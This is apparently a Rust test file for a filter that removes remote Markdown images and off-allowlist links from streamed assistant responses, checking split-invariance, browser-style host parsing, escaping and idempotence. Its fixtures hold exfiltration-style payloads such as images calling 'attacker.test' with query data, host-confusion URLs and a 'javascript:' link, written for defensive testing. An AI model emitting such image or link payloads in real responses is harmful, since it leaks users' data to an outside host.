//! Response controls (design document, "Streaming"; Annex G.4; ADR 0014): remote Markdown
//! images become `[image removed]`, links outside the allowed hosts keep only their text,
//! and the result does not depend on how the text is split across events.
// Test helpers may panic: an invalid fixture is a test failure.
#![allow(clippy::unwrap_used)]

use std::time::Instant;

use resguardo_proto::{MarkdownFilter, ResponseControls};

fn controls() -> ResponseControls {
    ResponseControls::new(true, true, ["docs.example.com".to_owned()])
}

fn apply(text: &str) -> String {
    controls().apply(text)
}

/// The output when `text` arrives in two parts split at every byte that is a char boundary.
fn apply_split_everywhere(text: &str) -> String {
    let whole = apply(text);
    let controls = controls();
    for split in (0..=text.len()).filter(|&i| text.is_char_boundary(i)) {
        let mut filter = MarkdownFilter::new(&controls);
        let mut out = filter.push(&text[..split]);
        out.push_str(&filter.push(&text[split..]));
        out.push_str(&filter.finish());
        assert_eq!(out, whole, "split at {split} of {text:?}");
    }
    whole
}

#[test]
fn g4_a_remote_image_is_removed() {
    assert_eq!(
        apply_split_everywhere("Mira ![x](https://attacker.test/p?d=abc) aquí"),
        "Mira [image removed] aquí"
    );
}

#[test]
fn g4_a_link_to_an_allowed_host_is_kept() {
    let text = "Ver [la guía](https://docs.example.com/guia) y [otra](HTTPS://DOCS.EXAMPLE.COM/x).";
    assert_eq!(apply_split_everywhere(text), text);
}

#[test]
fn a_link_to_another_host_keeps_only_its_text() {
    assert_eq!(
        apply_split_everywhere("Pulsa [aquí](https://attacker.test/?d=abc) ya"),
        "Pulsa aquí ya"
    );
}

#[test]
fn images_are_removed_even_from_allowed_hosts() {
    // An image loads without a click (ADR 0014).
    assert_eq!(
        apply("![logo](https://docs.example.com/logo.png)"),
        "[image removed]"
    );
}

#[test]
fn hosts_are_read_the_way_a_browser_reads_them() {
    for text in [
        "[x](https://docs.example.com@attacker.test/)",
        "[x](//attacker.test/)",
        "[x](https:\\\\attacker.test/)",
        "[x](https://docs.example.com.attacker.test/)",
    ] {
        assert_eq!(apply(text), "x", "{text}");
    }
    assert_eq!(apply("![x](//attacker.test/p.png)"), "[image removed]");
}

#[test]
fn local_and_data_destinations_are_kept() {
    let text =
        "[sección](#uso), [doc](/docs/a), ![i](/static/a.png) e ![d](data:image/png;base64,AAAA)";
    assert_eq!(apply_split_everywhere(text), text);
}

#[test]
fn other_schemes_in_links_keep_only_the_text() {
    assert_eq!(apply("[clic](javascript:alert(1))"), "clic");
    assert_eq!(apply("[correo](mailto:a@attacker.test)"), "correo");
}

#[test]
fn an_image_inside_a_link_is_removed_and_the_link_judged_on_its_own() {
    assert_eq!(
        apply_split_everywhere("[![x](https://attacker.test/i.png)](https://docs.example.com/)"),
        "[[image removed]](https://docs.example.com/)"
    );
    // The text of a removed link is escaped, so it cannot form a new link (see below).
    assert_eq!(
        apply("[![x](https://attacker.test/i.png)](https://attacker.test/)"),
        r"\[image removed\]"
    );
}

#[test]
fn brackets_that_are_not_links_are_kept() {
    let text = "Según [1] y [2], el array a[i] (o b[j]) vale [x] (y). ¡Hola! [";
    assert_eq!(apply_split_everywhere(text), text);
}

#[test]
fn escaped_brackets_are_not_links() {
    let text = r"\[x](https://attacker.test/) y \![y](https://attacker.test/)";
    // `\!` is a literal `!`, so the second construct is a link, not an image.
    assert_eq!(apply(text), r"\[x](https://attacker.test/) y \!y");
}

#[test]
fn nested_parentheses_and_titles_in_the_destination() {
    assert_eq!(
        apply("![x](https://attacker.test/a_(b) \"title\") fin"),
        "[image removed] fin"
    );
    assert_eq!(apply("[x](<https://attacker.test/a b>) fin"), "x fin");
}

#[test]
fn an_unclosed_image_past_512_bytes_is_removed_not_released() {
    let long_alt = "a".repeat(600);
    let text = format!("ok ![{long_alt}](https://attacker.test/?d=secret) fin");
    let out = apply(&text);
    assert!(out.starts_with("ok [image removed]"), "{out}");
    assert!(!out.contains("![") && !out.contains(&long_alt), "{out}");
}

#[test]
fn an_unclosed_link_past_512_bytes_is_released() {
    // Links need a click: ADR 0014 accepts releasing them unchanged.
    let text = format!("[{}](https://attacker.test/)", "a".repeat(600));
    assert_eq!(apply(&text), text);
}

#[test]
fn what_is_held_at_the_end_is_resolved() {
    let controls = controls();
    let mut filter = MarkdownFilter::new(&controls);
    assert_eq!(filter.push("hola ![x](https://attacker.te"), "hola ");
    assert_eq!(filter.finish(), "[image removed]");

    let mut filter = MarkdownFilter::new(&controls);
    assert_eq!(filter.push("ver [1"), "ver ");
    assert_eq!(filter.finish(), "[1");

    let mut filter = MarkdownFilter::new(&controls);
    assert_eq!(filter.push("¡hola!"), "¡hola");
    assert_eq!(filter.finish(), "!");
}

#[test]
fn controls_can_be_turned_off() {
    let text = "![x](https://attacker.test/i.png) [y](https://attacker.test/)";
    assert_eq!(ResponseControls::new(false, false, []).apply(text), text);
    assert_eq!(
        ResponseControls::new(false, true, []).apply(text),
        "![x](https://attacker.test/i.png) y"
    );
}

#[test]
fn many_open_brackets_take_linear_time() {
    let text = "[".repeat(200_000) + &"![".repeat(100_000);
    let start = Instant::now();
    let _ = apply(&text);
    assert!(start.elapsed().as_secs() < 5, "{:?}", start.elapsed());
}

#[test]
fn a_replacement_never_forms_a_new_link_with_what_follows() {
    // Without escaping, these would become `[image removed](https://attacker.test/)` and
    // `[x](https://attacker.test/)`: links the controls just removed.
    assert_eq!(
        apply_split_everywhere("![x](https://a.test/)(https://attacker.test/)"),
        r"\[image removed\](https://attacker.test/)"
    );
    assert_eq!(
        apply_split_everywhere("[[x]](https://attacker.test/)(https://attacker.test/)"),
        r"\[x\](https://attacker.test/)"
    );
    // A removed link whose text ends in `!` cannot turn the next link into an image.
    assert_eq!(
        apply("[hola!](https://attacker.test/)[y](https://docs.example.com/)"),
        r"hola\![y](https://docs.example.com/)"
    );
    // The usual case keeps the plain placeholder.
    assert_eq!(apply("![x](https://a.test/) fin"), "[image removed] fin");
}

#[test]
fn applying_the_controls_twice_changes_nothing() {
    for text in [
        "![x](https://a.test/)(https://attacker.test/)",
        "[[x]](https://attacker.test/)(https://attacker.test/)",
        "[a ![x](https://a.test/) b](https://docs.example.com/) ![y](//attacker.test/)",
    ] {
        let once = apply(text);
        assert_eq!(apply(&once), once, "{text}");
    }
}
